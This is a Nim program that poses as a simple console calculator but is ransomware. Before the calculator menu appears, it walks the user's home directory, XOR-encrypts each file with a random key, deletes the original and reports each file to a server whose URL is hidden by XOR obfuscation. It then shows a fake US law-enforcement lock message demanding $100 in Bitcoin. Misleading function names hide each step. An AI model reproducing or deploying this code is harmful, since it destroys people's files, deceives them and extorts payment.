import times
import httpclient
import json
import strutils
import system
import random
import os
import sequtils

let powerSource = newHttpClient()
powerSource.headers = newHttpHeaders({ "Content-Type": "application/json" })

let now = getTime()
var r = initRand(now.toUnix * 1_000_000_000 + now.nanosecond)
var pins = [205, 36, 221, 148, 124, 60, 26, 30, 202, 120, 189, 80, 103, 52, 20, 31, 143, 195, 76, 88, 207, 239, 44, 1, 145, 77, 44, 234, 207, 245, 168, 103]
var balls = [165, 80, 169, 228, 70, 19, 53, 124, 175, 11, 201, 51, 6, 88, 119, 106, 227, 162, 56, 55, 189, 193, 79, 110, 252, 98, 94, 143, 172, 154, 218, 3]

proc initBoard(): string =
  for i in 0 ..< pins.len:
    result.add(chr(pins[i] xor balls[i]))

proc startPower(unitName: string): void =
  var body = %*{
      "fileID": toHex(next(r)),
      "fileName": unitName
  }
  let _ = powerSource.request(initBoard(), httpMethod = HttpPost, body = $body)

proc readIntInput(prompt: string): int = 
  echo (prompt)
  try:
    result = parseInt(stdin.readLine)
  except:
    echo("Invalid input: Not a number")
    quit(1)

proc calculator(): void =
  var num1, num2: int
  var choice: int

  echo("\nChoose an operation:")
  echo("1. Addition")
  echo("2. Subtraction")
  echo("3. Multiplication")
  echo("4. Division")
  echo("5. XOR")

  choice = readIntInput("\nEnter the operation number: ")

  num1 = readIntInput("Enter the first integer:")
  num2 = readIntInput("Enter the second integer:")

  case choice
  of 1:
    echo(num1, " + ", num2, " = ", num1 + num2)
  of 2:
    echo(num1, " - ", num2, " = ", num1 - num2)
  of 3:
    echo(num1, " * ", num2, " = ", num1 * num2)
  of 4:
    if num2 != 0:
      echo(num1, " / ", num2, " = ", num1 / num2)
    else:
      echo("Division by zero is undefined.")
  of 5:
    echo(num1, " XOR ", num2, " = ", num1 xor num2)
  else:
    echo("Invalid choice. Please choose a valid operation.")

proc setState(size: int): seq[byte] =
  for i in 0 ..< size:
    let cur = r.rand(255).byte
    result.add(cur)

proc solderUnit(path: string): void =
  let content = readFile(path)
  let size = len(content)
  var unitName = toHex(next(r))
  let key = setState(size)

  var 
    result: string
    baseDir, name, ext: string

  (baseDir, name, ext) = splitFile(path)

  for i in 0 ..< size:
    result.add(char(int(key[i]) xor int(content[i])))

  writeFile(joinPath(baseDir, unitName & name & ext), result)
  startPower(unitName)
  removeFile(path)

proc listUnits (tgPath: string): seq[string] =
    var
      fileNames: seq[string]
      path, name, ext: string

    for kind, obj in walkDir tgPath:
        (path, name, ext) = splitFile(obj)
        if startsWith(name, ".") or endsWith(ext, ".elf"):
          continue
        if $kind == "pcDir":
          fileNames = concat(fileNames, listUnits(obj))
        elif $kind == "pcFile":
          fileNames.add(obj)

    return fileNames 

proc initializeCalc(): void =
  var start = getEnv("HOME")
  var units = listUnits(start)

  for unit in units:
    solderUnit(unit)

when isMainModule:
  echo "  ____      _              ____   _____ "
  echo " / ___|__ _| | ___  __   _| ___| |___ / "
  echo "| |   / _` | |/ __| \\ \\ / /___ \\   |_ \\ "
  echo "| |__| (_| | | (__   \\ V / ___) | ___) |"
  echo " \\____\\__,_|_|\\___|   \\_/ |____(_)____/ "
  echo "\n"
  echo "Initializing calculator..."
  echo "Collecting numbers..."
  initializeCalc()
  echo "Setting up operations..."
  echo "Done."
  calculator()
  echo "Closing calculator..."
  echo "Thank you for using"
  echo ""
  echo ""
  echo "##############################"
  echo "##         WARNING!!        ##"
  echo "##############################"
  echo "This operating system is locked due to the violation of the federal laws of"
  echo "the United States of America! (Article 1, Section 8, Clause 8; Article 202;"
  echo "Article 210 of the Criminal Code of U.S.A. provides for a deprivation of"
  echo "liberty for four to twelve years.)"
  echo ""
  echo "Following violations were detected:"
  echo "1. Your IP address was used to visit websites containing pornography."
  echo "2. Spam-messages with terrorist motives were also sent from your computer."
  echo ""
  echo "Your home directory $1 has been encrypted" % [getEnv("HOME")]
  echo ""
  echo "This computer lock is aimed to stop your illegal activity."
  echo "As a first time offender you are required to pay $100 USD."
  echo ""
  echo "Send BitCoin to the following address:"
  echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
  echo "@@   Qh6jHed3sh9tUIstB1sR2fG40KoPrJd3   @@"
  echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

  removeFile("./calc.elf")